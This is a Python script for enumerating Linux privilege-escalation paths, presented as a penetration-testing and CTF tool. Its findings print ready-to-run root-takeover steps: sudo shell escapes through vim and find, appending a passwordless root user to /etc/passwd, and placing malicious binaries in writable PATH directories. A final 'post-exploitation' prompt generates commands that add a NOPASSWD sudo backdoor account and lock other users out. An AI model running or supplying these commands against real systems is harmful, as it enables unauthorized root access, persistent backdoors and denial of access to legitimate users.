#!/usr/bin/env python3
"""
Privilege Escalation Enumeration Script
For Ethical Hacking, Penetration Testing, and CTF scenarios only
"""

import os
import sys
import subprocess
import platform
import pwd
import grp
import stat
import glob
from pathlib import Path
import re

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class PrivEscEnum:
    def __init__(self):
        self.current_user = os.getenv('USER') or os.getenv('USERNAME')
        self.uid = os.getuid() if hasattr(os, 'getuid') else None
        self.os_info = platform.system()
        self.findings = []
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                PRIVILEGE ESCALATION ENUMERATION              ║
║                    FOR ETHICAL HACKING ONLY                  ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
        
    def run_command(self, command, suppress_errors=True):
        """Execute a command and return output"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout.strip() if result.returncode == 0 else ""
        except Exception:
            return "" if suppress_errors else None
    
    def print_section(self, title):
        print(f"\n{Colors.YELLOW}{Colors.BOLD}{'='*60}")
        print(f"  {title}")
        print(f"{'='*60}{Colors.END}")
    
    def print_finding(self, category, description, recommendation=""):
        finding = f"{Colors.RED}[!] {category}: {Colors.WHITE}{description}"
        if recommendation:
            finding += f"\n    {Colors.GREEN}→ Recommendation: {recommendation}{Colors.END}"
        print(finding)
        self.findings.append((category, description, recommendation))
    
    def print_info(self, info):
        print(f"{Colors.BLUE}[i] {info}{Colors.END}")
    
    def check_system_info(self):
        self.print_section("SYSTEM INFORMATION")
        
        # OS Information
        os_release = self.run_command("cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null")
        kernel = self.run_command("uname -a")
        hostname = self.run_command("hostname")
        
        self.print_info(f"Hostname: {hostname}")
        self.print_info(f"Kernel: {kernel}")
        self.print_info(f"OS: {os_release.split()[0] if os_release else 'Unknown'}")
        self.print_info(f"Current User: {self.current_user} (UID: {self.uid})")
        
        # Check for vulnerable kernel versions
        if "Ubuntu" in os_release:
            ubuntu_version = re.search(r'Ubuntu (\d+\.\d+)', os_release)
            if ubuntu_version:
                version = ubuntu_version.group(1)
                if version in ["16.04", "18.04", "20.04"]:
                    self.print_finding("KERNEL", f"Potentially vulnerable Ubuntu {version}",
                                     "Check for kernel exploits (DirtyCow, etc.)")
    
    def check_sudo_permissions(self):
        self.print_section("SUDO PERMISSIONS")
        
        sudo_list = self.run_command("sudo -l 2>/dev/null")
        if sudo_list:
            self.print_info("Sudo permissions found:")
            print(f"{Colors.WHITE}{sudo_list}{Colors.END}")
            
            # Check for dangerous sudo permissions
            dangerous_commands = ['ALL', '/bin/bash', '/bin/sh', '/usr/bin/vim', '/usr/bin/nano', 
                                '/usr/bin/find', '/usr/bin/awk', '/usr/bin/python']
            
            for cmd in dangerous_commands:
                if cmd in sudo_list:
                    if cmd == 'ALL':
                        self.print_finding("SUDO", f"User can run ALL commands as root",
                                         "Execute: sudo su -")
                    elif cmd in ['/bin/bash', '/bin/sh']:
                        self.print_finding("SUDO", f"User can run {cmd} as root",
                                         f"Execute: sudo {cmd}")
                    elif cmd == '/usr/bin/vim':
                        self.print_finding("SUDO", "User can run vim as root",
                                         "Execute: sudo vim -c ':!/bin/sh'")
                    elif cmd == '/usr/bin/find':
                        self.print_finding("SUDO", "User can run find as root",
                                         "Execute: sudo find . -exec /bin/sh \\; -quit")
        else:
            self.print_info("No sudo permissions found or sudo not available")
    
    def check_suid_sgid(self):
        self.print_section("SUID/SGID BINARIES")
        
        # Common SUID locations
        suid_paths = ['/usr/bin', '/bin', '/usr/sbin', '/sbin', '/usr/local/bin']
        
        suid_files = []
        for path in suid_paths:
            if os.path.exists(path):
                result = self.run_command(f"find {path} -perm -4000 -type f 2>/dev/null")
                if result:
                    suid_files.extend(result.split('\n'))
        
        # Check for interesting SUID binaries
        interesting_suid = ['vim', 'nano', 'find', 'python', 'perl', 'ruby', 'php', 'bash', 'sh']
        
        for suid_file in suid_files:
            if suid_file:
                binary_name = os.path.basename(suid_file)
                self.print_info(f"SUID: {suid_file}")
                
                if any(interesting in binary_name.lower() for interesting in interesting_suid):
                    self.print_finding("SUID", f"Potentially exploitable SUID binary: {suid_file}",
                                     f"Check GTFOBins for {binary_name} exploitation")
    
    def check_writable_files(self):
        self.print_section("WRITABLE FILES AND DIRECTORIES")
        
        # Check /etc/passwd
        if os.access('/etc/passwd', os.W_OK):
            self.print_finding("WRITABLE", "/etc/passwd is writable",
                             "Add new root user: echo 'newroot::0:0:root:/root:/bin/bash' >> /etc/passwd")
        
        # Check /etc/shadow
        if os.access('/etc/shadow', os.W_OK):
            self.print_finding("WRITABLE", "/etc/shadow is writable",
                             "Modify root password hash")
        
        # Check common writable directories
        writable_dirs = ['/tmp', '/var/tmp', '/dev/shm']
        for directory in writable_dirs:
            if os.path.exists(directory) and os.access(directory, os.W_OK):
                self.print_info(f"Writable directory: {directory}")
    
    def check_cron_jobs(self):
        self.print_section("CRON JOBS")
        
        # Check user crontab
        user_cron = self.run_command("crontab -l 2>/dev/null")
        if user_cron:
            self.print_info("User crontab entries:")
            print(f"{Colors.WHITE}{user_cron}{Colors.END}")
        
        # Check system cron
        system_cron_dirs = ['/etc/crontab', '/etc/cron.d/', '/var/spool/cron/']
        for cron_path in system_cron_dirs:
            if os.path.exists(cron_path):
                if os.path.isfile(cron_path):
                    content = self.run_command(f"cat {cron_path} 2>/dev/null")
                    if content:
                        self.print_info(f"System cron ({cron_path}):")
                        print(f"{Colors.WHITE}{content}{Colors.END}")
                        
                        # Check for writable cron scripts
                        for line in content.split('\n'):
                            if line.strip() and not line.startswith('#'):
                                parts = line.split()
                                if len(parts) > 6:
                                    script_path = parts[6]
                                    if os.path.exists(script_path) and os.access(script_path, os.W_OK):
                                        self.print_finding("CRON", f"Writable cron script: {script_path}",
                                                         "Modify script to escalate privileges")
    
    def check_services(self):
        self.print_section("RUNNING SERVICES")
        
        # Check for services running as root
        processes = self.run_command("ps aux | grep -v grep")
        if processes:
            root_processes = [line for line in processes.split('\n') if line.startswith('root')]
            self.print_info(f"Services running as root: {len(root_processes)}")
            
            # Look for interesting services
            interesting_services = ['mysql', 'apache', 'nginx', 'ssh', 'ftp']
            for process in root_processes[:10]:  # Limit output
                for service in interesting_services:
                    if service in process.lower():
                        self.print_info(f"Interesting service: {process}")
    
    def check_network(self):
        self.print_section("NETWORK INFORMATION")
        
        # Network interfaces
        interfaces = self.run_command("ip a 2>/dev/null || ifconfig 2>/dev/null")
        if interfaces:
            self.print_info("Network interfaces found")
        
        # Listening ports
        netstat = self.run_command("netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null")
        if netstat:
            listening = [line for line in netstat.split('\n') if 'LISTEN' in line or 'State' in line]
            self.print_info(f"Listening ports: {len(listening)-1 if listening else 0}")
    
    def check_path_hijacking(self):
        self.print_section("PATH HIJACKING OPPORTUNITIES")
        
        path_dirs = os.environ.get('PATH', '').split(':')
        writable_paths = []
        
        for path_dir in path_dirs:
            if path_dir and os.path.exists(path_dir) and os.access(path_dir, os.W_OK):
                writable_paths.append(path_dir)
        
        if writable_paths:
            self.print_finding("PATH", f"Writable PATH directories: {', '.join(writable_paths)}",
                             "Place malicious binaries in these directories")
        
        # Check for relative paths in scripts
        if '.' in path_dirs:
            self.print_finding("PATH", "Current directory (.) in PATH",
                             "Create malicious binaries in current directory")
    
    def generate_summary(self):
        self.print_section("SUMMARY AND RECOMMENDATIONS")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No obvious privilege escalation vectors found.{Colors.END}")
            print(f"{Colors.YELLOW}[!] Consider manual enumeration and exploit research.{Colors.END}")
        else:
            print(f"{Colors.RED}[!] Found {len(self.findings)} potential privilege escalation vectors:{Colors.END}\n")
            
            for i, (category, description, recommendation) in enumerate(self.findings, 1):
                print(f"{Colors.BOLD}{i}. {category}:{Colors.END} {description}")
                if recommendation:
                    print(f"   {Colors.GREEN}→ {recommendation}{Colors.END}")
                print()
    
    def user_management_prompt(self):
        self.print_section("POST-EXPLOITATION USER MANAGEMENT")
        
        print(f"{Colors.YELLOW}WARNING: This section is for authorized penetration testing only!{Colors.END}\n")
        
        response = input(f"{Colors.CYAN}Do you want to remove rights of all users except root and create a backdoor account? (yes/no): {Colors.END}")
        
        if response.lower() in ['yes', 'y']:
            backdoor_user = input(f"{Colors.CYAN}Enter backdoor username: {Colors.END}")
            backdoor_pass = input(f"{Colors.CYAN}Enter backdoor password: {Colors.END}")
            
            print(f"\n{Colors.RED}EXECUTE THE FOLLOWING COMMANDS AS ROOT:{Colors.END}")
            print(f"{Colors.WHITE}")
            print("# Create backdoor user with root privileges")
            print(f"useradd -m -s /bin/bash {backdoor_user}")
            print(f"echo '{backdoor_user}:{backdoor_pass}' | chpasswd")
            print(f"usermod -aG sudo {backdoor_user}")
            print(f"echo '{backdoor_user} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
            print()
            print("# Disable other user accounts (DANGEROUS - BACKUP FIRST!)")
            print("# List all users first:")
            print("cut -d: -f1 /etc/passwd | grep -v root | grep -v nobody | grep -v daemon")
            print()
            print("# To disable a user account:")
            print("# usermod -L username  # Lock account")
            print("# usermod -s /bin/false username  # Disable shell")
            print()
            print("# To remove user from sudo group:")
            print("# deluser username sudo")
            print(f"{Colors.END}")
            
            print(f"\n{Colors.YELLOW}Remember to document all changes for your penetration test report!{Colors.END}")
        else:
            print(f"{Colors.GREEN}Skipping user management modifications.{Colors.END}")
    
    def run_enumeration(self):
        """Run the complete enumeration"""
        try:
            self.print_banner()
            
            if os.geteuid() == 0:
                print(f"{Colors.GREEN}[+] Already running as root!{Colors.END}")
                return
            
            self.check_system_info()
            self.check_sudo_permissions()
            self.check_suid_sgid()
            self.check_writable_files()
            self.check_cron_jobs()
            self.check_services()
            self.check_network()
            self.check_path_hijacking()
            
            self.generate_summary()
            
            # Only show user management if we found potential privesc vectors
            if self.findings:
                self.user_management_prompt()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Enumeration interrupted by user.{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Error during enumeration: {str(e)}{Colors.END}")

if __name__ == "__main__":
    print(f"{Colors.BOLD}Privilege Escalation Enumeration Script{Colors.END}")
    print(f"{Colors.YELLOW}For authorized penetration testing and ethical hacking only!{Colors.END}\n")
    
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print("Usage: python3 privesc_enum.py")
        print("This script enumerates potential privilege escalation vectors on Unix/Linux systems.")
        print("Designed for ethical hacking, penetration testing, and CTF scenarios.")
        sys.exit(0)
    
    # Confirm ethical usage
    confirm = input(f"{Colors.CYAN}Confirm this is authorized testing (yes/no): {Colors.END}")
    if confirm.lower() not in ['yes', 'y']:
        print(f"{Colors.RED}Exiting - Only use for authorized testing!{Colors.END}")
        sys.exit(1)
    
    enum = PrivEscEnum()
    enum.run_enumeration()


